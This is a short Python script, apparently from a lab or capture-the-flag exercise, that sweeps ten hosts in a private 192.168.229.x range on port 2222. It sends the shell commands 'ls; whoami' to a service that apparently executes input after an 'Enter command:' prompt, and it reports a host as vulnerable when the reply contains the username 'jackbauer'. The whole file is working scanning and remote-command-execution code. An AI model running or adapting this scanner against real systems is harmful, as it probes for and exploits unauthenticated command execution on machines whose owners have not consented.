#!/usr/bin/env python3

import socket

PORT = 2222       # The port used by the server
command = b"ls; whoami"

for x in range(130, 140):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            HOST=f"192.168.229.{x}"
            print(f"Connecting to {HOST}")
            s.connect((HOST, PORT))
            s.sendall(command)
            s.shutdown(socket.SHUT_WR)
            data = s.recv(1024) # first we need to receive the first message which is "Enter command:"
            data = s.recv(1024)
            if b"jackbauer" in data:
                print(f"Port {PORT} on {HOST} is vulnerable! ***************")
            # print(f"Received [{data.decode()}]")
    except OSError:
        pass